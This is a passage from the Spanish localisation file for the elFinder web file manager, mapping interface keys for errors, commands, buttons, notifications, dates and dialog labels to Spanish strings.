/**
 * Español internacional translation
 * @author Julián Torres <julian.torres@pabernosmatao.com>
 * @author Luis Faura <luis@luisfaura.es>
 * @author Adrià Vilanova <me@avm99963.tk>
 * @author Wilman Marín Duran <fuclo05@hotmail.com>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.es = {
		translator : 'Julián Torres &lt;julian.torres@pabernosmatao.com&gt;, Luis Faura &lt;luis@luisfaura.es&gt;, Adrià Vilanova &lt;me@avm99963.tk&gt;, Wilman Marín Duran &lt;fuclo05@hotmail.com&gt;',
		language   : 'Español internacional',
		direction  : 'ltr',
		dateFormat : 'M d, Y h:i A', // will show like: Feb 28, 2022 03:38 PM
		fancyDateFormat : '$1 h:i A', // will show like: Hoy 03:38 PM
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-153813
		messages   : {
			'getShareText' : 'Cuota',
			'Editor ': 'Editora de código',
			/********************************** errors **********************************/
			'error'                : 'Error',
			'errUnknown'           : 'Error desconocido.',
			'errUnknownCmd'        : 'Comando desconocido.',
			'errJqui'              : 'Configuración no válida de jQuery UI. Deben estar incluidos los componentes selectable, draggable y droppable.',
			'errNode'              : 'elFinder necesita crear elementos DOM.',
			'errURL'               : '¡Configuración no válida de elFinder! La opción URL no está configurada.',
			'errAccess'            : 'Acceso denegado.',
			'errConnect'           : 'No se ha podido conectar con el backend.',
			'errAbort'             : 'Conexión cancelada.',
			'errTimeout'           : 'Conexión cancelada por timeout.',
			'errNotFound'          : 'Backend no encontrado.',
			'errResponse'          : 'Respuesta no válida del backend.',
			'errConf'              : 'Configuración no válida del backend .',
			'errJSON'              : 'El módulo PHP JSON no está instalado.',
			'errNoVolumes'         : 'No hay disponibles volúmenes legibles.',
			'errCmdParams'         : 'Parámetros no válidos para el comando "$1".',
			'errDataNotJSON'       : 'los datos no están en formato JSON.',
			'errDataEmpty'         : 'No hay datos.',
			'errCmdReq'            : 'La petición del backend necesita un nombre de comando.',
			'errOpen'              : 'No se puede abrir "$1".',
			'errNotFolder'         : 'El objeto no es una carpeta.',
			'errNotFile'           : 'El objeto no es un archivo.',
			'errRead'              : 'No se puede leer "$1".',
			'errWrite'             : 'No se puede escribir en "$1".',
			'errPerm'              : 'Permiso denegado.',
			'errLocked'            : '"$1" está bloqueado y no puede ser renombrado, movido o borrado.',
			'errExists'            : 'Ya existe un archivo llamado "$1".',
			'errInvName'           : 'Nombre de archivo no válido.',
			'errInvDirname'        : 'Nombre de carpeta inválido.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Carpeta no encontrada.',
			'errFileNotFound'      : 'Archivo no encontrado.',
			'errTrgFolderNotFound' : 'Carpeta de destino "$1" no encontrada.',
			'errPopup'             : 'El navegador impide abrir nuevas ventanas. Puede activarlo en las opciones del navegador.',
			'errMkdir'             : 'No se puede crear la carpeta "$1".',
			'errMkfile'            : 'No se puede crear el archivo "$1".',
			'errRename'            : 'No se puede renombrar "$1".',
			'errCopyFrom'          : 'No se permite copiar archivos desde el volumen "$1".',
			'errCopyTo'            : 'No se permite copiar archivos al volumen "$1".',
			'errMkOutLink'         : 'No se ha podido crear el enlace fuera del volumen raíz.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Error en el envío.',  // old name - errUploadCommon
			'errUploadFile'        : 'No se ha podido cargar "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'No hay archivos para subir.',
			'errUploadTotalSize'   : 'El tamaño de los datos excede el máximo permitido.', // old name - errMaxSize
			'errUploadFileSize'    : 'El tamaño del archivo excede el máximo permitido.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Tipo de archivo no permitido.',
			'errUploadTransfer'    : 'Error al transferir "$1".',
			'errUploadTemp'        : 'No se ha podido crear el archivo temporal para la subida.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'El objeto "$1" ya existe y no puede ser reemplazado por otro con otro tipo.', // new
			'errReplace'           : 'No se puede reemplazar "$1".',
			'errSave'              : 'No se puede guardar "$1".',
			'errCopy'              : 'No se puede copiar "$1".',
			'errMove'              : 'No se puede mover "$1".',
			'errCopyInItself'      : 'No se puede copiar "$1" en si mismo.',
			'errRm'                : 'No se puede borrar "$1".',
			'errTrash'             : 'No se puede enviar a la papelera.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'No se puede(n) borrar los archivo(s).',
			'errExtract'           : 'No se puede extraer archivos desde "$1".',
			'errArchive'           : 'No se puede crear el archivo.',
			'errArcType'           : 'Tipo de archivo no soportado.',
			'errNoArchive'         : 'El archivo no es de tipo archivo o es de un tipo no soportado.',
			'errCmdNoSupport'      : 'El backend no soporta este comando.',
			'errReplByChild'       : 'La carpeta “$1” no puede ser reemplazada por un elemento contenido en ella.',
			'errArcSymlinks'       : 'Por razones de seguridad no se pueden descomprimir archivos que contengan enlaces simbólicos.', // edited 24.06.2012
			'errArcMaxSize'        : 'El tamaño del archivo excede el máximo permitido.',
			'errResize'            : 'Error al redimensionar "$1".',
			'errResizeDegree'      : 'Grado de rotación inválido.',  // added 7.3.2013
			'errResizeRotate'      : 'Error al rotar la imagen.',  // added 7.3.2013
			'errResizeSize'        : 'Tamaño de imagen inválido.',  // added 7.3.2013
			'errResizeNoChange'    : 'No se puede cambiar el tamaño de la imagen.',  // added 7.3.2013
			'errUsupportType'      : 'Tipo de archivo no soportado.',
			'errNotUTF8Content'    : 'El archivo "$1" no está en formato UTF-8 y no puede ser editado.',  // added 9.11.2011
			'errNetMount'          : 'Fallo al montar "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protocolo no soportado.',     // added 17.04.2012
			'errNetMountFailed'    : 'Fallo al montar.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Dominio requerido.', // added 18.04.2012
			'errSessionExpires'    : 'La sesión ha expirado por inactividad',
			'errCreatingTempDir'   : 'No se ha podido crear al directorio temporal: "$1"',
			'errFtpDownloadFile'   : 'No se ha podido descargar el archivo desde FTP: "$1"',
			'errFtpUploadFile'     : 'No se ha podido cargar el archivo a FTP: "$1"',
			'errFtpMkdir'          : 'No se ha podido crear el directorio remoto en FTP: "$1"',
			'errArchiveExec'       : 'Se ha producido un error durante el archivo: "$1"',
			'errExtractExec'       : 'Se ha producido un error durante la extracción de archivos: "$1"',
			'errNetUnMount'        : 'Imposible montar', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'No es convertible a UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Prueba con un navegador moderno, si quieres subir la carpeta completa.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Se agotó el tiempo de espera buscando "$1". Los resultados de búsqueda son parciales.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Se requiere autorizar de nuevo.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Número máximo de elementos seleccionables es $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'No se puede restaurar desde la papelera. No se puede identificar el destino de restauración.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Editor no encontrado para este tipo de archivo.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Error ocurrido en el lado del servidor.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'No es posible vaciar la carpeta "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Hay $1 más errores.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Puede crear carpetas de hasta $1 a la vez.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Crear archivo',
			'cmdback'      : 'Atrás',
			'cmdcopy'      : 'Copiar',
			'cmdcut'       : 'Cortar',
			'cmddownload'  : 'Descargar',
			'cmdduplicate' : 'Duplicar',
			'cmdedit'      : 'Editar archivo',
			'cmdextract'   : 'Extraer elementos del archivo',
			'cmdforward'   : 'Adelante',
			'cmdgetfile'   : 'Seleccionar archivos',
			'cmdhelp'      : 'Acerca de este software',
			'cmdhome'      : 'Inicio',
			'cmdinfo'      : 'Obtener información',
			'cmdmkdir'     : 'Nueva carpeta',
			'cmdmkdirin'   : 'En una nueva carpeta', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Nueva archivo',
			'cmdopen'      : 'Abrir',
			'cmdpaste'     : 'Pegar',
			'cmdquicklook' : 'Previsualizar',
			'cmdreload'    : 'Recargar',
			'cmdrename'    : 'Cambiar nombre',
			'cmdrm'        : 'Eliminar',
			'cmdtrash'     : 'Enviar a la papelera', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Restaurar', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Buscar archivos',
			'cmdup'        : 'Ir a la carpeta raíz',
			'cmdupload'    : 'Subir archivos',
			'cmdview'      : 'Ver',
			'cmdresize'    : 'Redimensionar y rotar',
			'cmdsort'      : 'Ordenar',
			'cmdnetmount'  : 'Montar volumen en red', // added 18.04.2012
			'cmdnetunmount': 'Desmontar', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'A Lugares', // added 28.12.2014
			'cmdchmod'     : 'Cambiar modo', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Abrir una carpeta', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Restablecer ancho de columna', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Pantalla completa', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Mover', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Vaciar la carpeta', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Deshacer', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Rehacer', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferencias', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Seleccionar todo', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Seleccionar ninguno', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Invertir selección', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Abrir en nueva ventana', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Ocultar (Preferencia)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Cerrar',
			'btnSave'   : 'Guardar',
			'btnRm'     : 'Eliminar',
			'btnApply'  : 'Aplicar',
			'btnCancel' : 'Cancelar',
			'btnNo'     : 'No',
			'btnYes'    : 'Sí',
			'btnMount'  : 'Montar',  // added 18.04.2012
			'btnApprove': 'Ir a $1 y aprobar', // from v2.1 added 26.04.2012
			'btnUnmount': 'Desmontar', // from v2.1 added 30.04.2012
			'btnConv'   : 'Convertir', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Aquí',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volumen',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Todos',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Tipo MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nombre de archivo',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Guardar y cerrar', // from v2.1 added 12.6.2015
			'btnBackup' : 'Copia de seguridad', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Renombrar',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Renombrar(Todo)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Ant ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Sig ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Guardar como', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Abrir carpeta',
			'ntffile'     : 'Abrir archivo',
			'ntfreload'   : 'Actualizar contenido de la carpeta',
			'ntfmkdir'    : 'Creando directorio',
			'ntfmkfile'   : 'Creando archivos',
			'ntfrm'       : 'Eliminando archivos',
			'ntfcopy'     : 'Copiar archivos',
			'ntfmove'     : 'Mover archivos',
			'ntfprepare'  : 'Preparar copia de archivos',
			'ntfrename'   : 'Renombrar archivos',
			'ntfupload'   : 'Subiendo archivos',
			'ntfdownload' : 'Descargando archivos',
			'ntfsave'     : 'Guardar archivos',
			'ntfarchive'  : 'Creando archivo',
			'ntfextract'  : 'Extrayendo elementos del archivo',
			'ntfsearch'   : 'Buscando archivos',
			'ntfresize'   : 'Redimensionando imágenes',
			'ntfsmth'     : 'Haciendo algo',
			'ntfloadimg'  : 'Cargando imagen',
			'ntfnetmount' : 'Montando volumen en red', // added 18.04.2012
			'ntfnetunmount': 'Desmontando volumen en red', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Adquiriendo tamaño de imagen', // added 20.05.2013
			'ntfreaddir'  : 'Leyendo información de la carpeta', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Obteniendo URL del enlace', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Cambiando el modo de archivo', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Verificando nombre del archivo subido', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Creando un archivo para descargar', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Obteniendo información de la ruta', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Procesando el archivo cargado', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Enviando a la papelera', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Restaurando desde la papelera', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Comprobando carpeta de destino', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Deshaciendo operación previa', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Rehaciendo previo deshacer', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Comprobación de contenidos', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Papelera', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'desconocida',
			'Today'       : 'Hoy',
			'Yesterday'   : 'Ayer',
			'msJan'       : 'Ene',
			'msFeb'       : 'Feb',
			'msMar'       : 'mar',
			'msApr'       : 'Abr',
			'msMay'       : 'May',
			'msJun'       : 'jun',
			'msJul'       : 'Jul',
			'msAug'       : 'Ago',
			'msSep'       : 'sep',
			'msOct'       : 'Oct',
			'msNov'       : 'Nov',
			'msDec'       : 'Dic',
			'January'     : 'Enero',
			'February'    : 'Febrero',
			'March'       : 'Marzo',
			'April'       : 'Abril',
			'May'         : 'Mayo',
			'June'        : 'Junio',
			'July'        : 'Julio',
			'August'      : 'Agosto',
			'September'   : 'Septiembre',
			'October'     : 'Octubre',
			'November'    : 'Noviembre',
			'December'    : 'Diciembre',
			'Sunday'      : 'Domingo',
			'Monday'      : 'Lunes',
			'Tuesday'     : 'Martes',
			'Wednesday'   : 'Miércoles',
			'Thursday'    : 'Jueves',
			'Friday'      : 'Viernes',
			'Saturday'    : 'Sábado',
			'Sun'         : 'Dom',
			'Mon'         : 'Lun',
			'Tue'         : 'Mar',
			'Wed'         : 'Mie',
			'Thu'         : 'Jue',
			'Fri'         : 'Vie',
			'Sat'         : 'Sab',

			/******************************** sort variants ********************************/
			'sortname'          : 'por nombre',
			'sortkind'          : 'por tipo',
			'sortsize'          : 'por tamaño',
			'sortdate'          : 'por fecha',
			'sortFoldersFirst'  : 'Las carpetas primero',
			'sortperm'          : 'por permiso', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'por modo',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'por propietario',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'por grupo',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'También árbol de directorios',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NuevoArchivo.txt', // added 10.11.2015
			'untitled folder'   : 'NuevaCarpeta',   // added 10.11.2015
			'Archive'           : 'NuevoArchivo',  // from v2.1 added 10.11.2015
			'untitled file'     : 'Archivo nuevo.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Archivar',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Se necesita confirmación',
			'confirmRm'       : '¿Está seguro de querer eliminar archivos?<br/>¡Esto no se puede deshacer!',
			'confirmRepl'     : '¿Reemplazar el antiguo archivo con el nuevo?',
			'confirmRest'     : '¿Reemplazar elemento existente con el elemento en la papelera?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'No está en UTF-8<br/>Convertir a UTF-8?<br/>Los contenidos se guardarán en UTF-8 tras la conversión.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Codificación de caracteres de este archivo no pudo ser detectada. Es necesario convertir temporalmente a UTF-8 para editarlo. <br/> Por favor, seleccione la codificación de caracteres de este archivo.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Ha sido modificado.<br/>Perderás los cambios si no los guardas.', // from v2.1 added 15.7.2015
			'confirmTrash'    : '¿Estás seguro que quieres mover los elementos a la papelera?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : '¿Estás segura de que quieres mover elementos a "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Aplicar a todo',
			'name'            : 'Nombre',
			'size'            : 'Tamaño',
			'perms'           : 'Permisos',
			'modify'          : 'Modificado',
			'kind'            : 'Tipo',
			'read'            : 'lectura',
			'write'           : 'escritura',
			'noaccess'        : 'sin acceso',
			'and'             : 'y',
			'unknown'         : 'desconocido',
			'selectall'       : 'Seleccionar todos los archivos',
			'selectfiles'     : 'Seleccionar archivo(s)',
			'selectffile'     : 'Seleccionar primer archivo',
			'selectlfile'     : 'Seleccionar último archivo',
			'viewlist'        : 'ver como lista',
			'viewicons'       : 'Ver como iconos',
			'viewSmall'       : 'Iconos pequeños', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Iconos medianos', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Iconos grandes', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Iconos extra grandes', // from v2.1.39 added 22.5.2018
			'places'          : 'Lugares',
			'calc'            : 'Calcular',
			'path'            : 'Ruta',
			'aliasfor'        : 'Alias para',
			'locked'          : 'Bloqueado',
			'dim'             : 'Dimensiones',
			'files'           : 'Archivos',
			'folders'         : 'Carpetas',
			'items'           : 'Elementos',
			'yes'             : 'sí',
			'no'              : 'no',
			'link'            : 'Enlace',
			'searcresult'     : 'Resultados de la búsqueda',
			'selected'        : 'elementos seleccionados',
			'about'           : 'Acerca',
			'shortcuts'       : 'Accesos directos',
			'help'            : 'Ayuda',
			'webfm'           : 'Administrador de archivos web',
			'ver'             : 'Versión',
			'protocolver'     : 'versión del protocolo',
			'homepage'        : 'Inicio',
			'docs'            : 'Documentación',
			'github'          : 'Bifúrcanos en Github',
			'twitter'         : 'Síguenos en Twitter',
			'facebook'        : 'Únete a nosotros en Facebook',
			'team'            : 'Equipo',
			'chiefdev'        : 'desarrollador jefe',
			'developer'       : 'desarrollador',
			'contributor'     : 'contribuyente',
			'maintainer'      : 'mantenedor',
			'translator'      : 'traductor',
			'icons'           : 'Iconos',
			'dontforget'      : 'y no olvide traer su toalla',
			'shortcutsof'     : 'Accesos directos desactivados',
			'dropFiles'       : 'Arrastre archivos aquí',
			'or'              : 'o',
			'selectForUpload' : 'Seleccione archivos para subir',
			'moveFiles'       : 'Mover archivos',
			'copyFiles'       : 'Copiar archivos',
			'restoreFiles'    : 'Restaurar elementos', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Eliminar en sus ubicaciones',
			'aspectRatio'     : 'Relación de aspecto',
			'scale'           : 'Escala',
			'width'           : 'Ancho',
			'height'          : 'Alto',
			'resize'          : 'Redimensionar',
			'crop'            : 'Recortar',
			'rotate'          : 'Rotar',
			'rotate-cw'       : 'Rotar 90 grados en sentido horario',
			'rotate-ccw'      : 'Rotar 90 grados en sentido anti-horario',
			'degree'          : '°',
			'netMountDialogTitle' : 'Montar volumen en red', // added 18.04.2012
			'protocol'            : 'Protocolo', // added 18.04.2012
			'host'                : 'Dominio', // added 18.04.2012
			'port'                : 'Puerto', // added 18.04.2012
			'user'                : 'Usuario', // added 18.04.2012
			'pass'                : 'Contraseña', // added 18.04.2012
			'confirmUnmount'      : '¿Desmontar $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Arrastra o pega archivos del navegador', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Arrastra o pega enlaces URL aquí', // from v2.1 added 07.04.2014
			'encoding'        : 'Codificando', // from v2.1 added 19.12.2014
			'locale'          : 'Local',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Destino: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Buscar entrada por tipo MIME', // from v2.1 added 22.5.2015
			'owner'           : 'Propietario', // from v2.1 added 20.6.2015
			'group'           : 'Grupo', // from v2.1 added 20.6.2015
			'other'           : 'Otro', // from v2.1 added 20.6.2015
			'execute'         : 'Ejecutar', // from v2.1 added 20.6.2015
			'perm'            : 'Permiso', // from v2.1 added 20.6.2015
			'mode'            : 'Modo', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'La carpeta está vacía', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'La carpeta está vacía\\A Arrastrar para añadir elementos', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'La carpeta está vacía\\A Presiona durante un rato para añadir elementos', // from v2.1.6 added 30.12.2015
			'quality'         : 'Calidad', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Sincronización automática',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Mover arriba',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Obtener enlace', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'Elementos seleccionados ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID carpeta', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Permitir acceso sin conexión', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Para volver a autenticarse', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Cargando ahora...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Abrir múltiples archivos', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Estás tratando de abrir los $1 archivos. ¿Estás seguro que quieres abrir en el navegador?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'No se encontraron resultados en el objetivo de búsqueda.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Está editando un archivo.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Has seleccionado $1 elementos.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Posees $1 elementos en el portapapeles.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'La búsqueda incremental solo se realiza desde la vista actual.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Reinstanciar', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 completo', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Menú contextual', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Cambio de página', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'Raíces del volumen', // from v2.1.16 added 16.9.2016
			'reset'           : 'Reiniciar', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Color de fondo', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Selector de color', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : '8px Cuadricula', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Habilitado', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Deshabilitado', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Los resultados de la búsqueda están vacíos en la vista actual. \\ APulse [Intro] para expandir el objetivo de búsqueda.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'La primera letra de los resultados de búsqueda está vacía en la vista actual.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Etiqueta de texto', // from v2.1.17 added 13.10.2016
			'minsLeft'        : 'Falta $1 minuto(s)', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Abrir nuevamente con la codificación seleccionada', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Guardar con la codificación seleccionada', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Seleccionar carpeta', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Primera letra de búsqueda', // from v2.1.23 added 24.3.2017
			'presets'         : 'Preestablecidos', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Son demasiados elementos, por lo que no puede enviarse a la papelera.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Área de texto', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Vaciar la carpeta "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'No hay elementos en la carpeta "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferencia', // from v2.1.26 added 28.6.2017
			'language'        : 'Lenguaje', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inicializa la configuración guardada en este navegador', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Configuración de la barra de herramientas', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '...falta $1 caracteres.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... Quedan $1 líneas.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Suma', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Tamaño de archivo aproximado', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Centrado en el elemento de diálogo con \'mouseover\'',  // from v2.1.30 added 2.11.2017
			'select'          : 'Seleccionar', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Acción cuando selecciona un archivo', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Abrir con el editor utilizado la última vez', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Invertir selección', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : '¿Estás seguro que quieres renombrar $1 elementos seleccionados como $2?<br/>¡Esto no puede ser deshecho!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Cambiar el nombre del lote', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Número', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Añadir prefijo', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Añadir sufijo', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Cambiar extensión', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Configuración de columnas (Vista de lista)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Todos los cambios se reflejarán inmediatamente en el archivo.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Cualquier cambio no se reflejará hasta que no se desmonte este volumen.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Los siguientes volúmenes montados en este volumen también se desmontaron. ¿Estás seguro de desmontarlo?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Información de la selección', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritmos para mostrar el hash de archivos', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Elementos de información (Panel de información de selección)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Presiona de nuevo para salir.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Barra de herramienta', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Espacio de trabajo', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Diálogo', // from v2.1.38 added 4.4.2018
			'all'             : 'Todo', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Tamaño de icono (vista de iconos)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Abra la ventana del editor maximizado', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Debido a que la conversión por API no está disponible actualmente, realice la conversión en el sitio web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Después de la conversión, debe cargar la URL del elemento o un archivo descargado para guardar el archivo convertido.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Convertir en el sitio de $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'integraciones', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Este elFinder tiene integrados los siguientes servicios externos. Consulte los términos de uso, la política de privacidad, etc. antes de usarlo.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Mostrar elementos ocultos', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Ocultar elementos ocultos', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Mostrar/Ocultar elementos ocultos', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Tipos de archivos para habilitar con "Nuevo archivo"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Tipo de archivo de texto', // from v2.1.41 added 7.8.2018
			'add'             : 'Agregar', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Por defecto', // from v2.1.43 added 19.10.2018
			'description'     : 'Descripción', // from v2.1.43 added 19.10.2018
			'website'         : 'Sitio web', // from v2.1.43 added 19.10.2018
			'author'          : 'Autora', // from v2.1.43 added 19.10.2018
			'email'           : 'Correo electrónico', // from v2.1.43 added 19.10.2018
			'license'         : 'Licencia', // from v2.1.43 added 19.10.2018
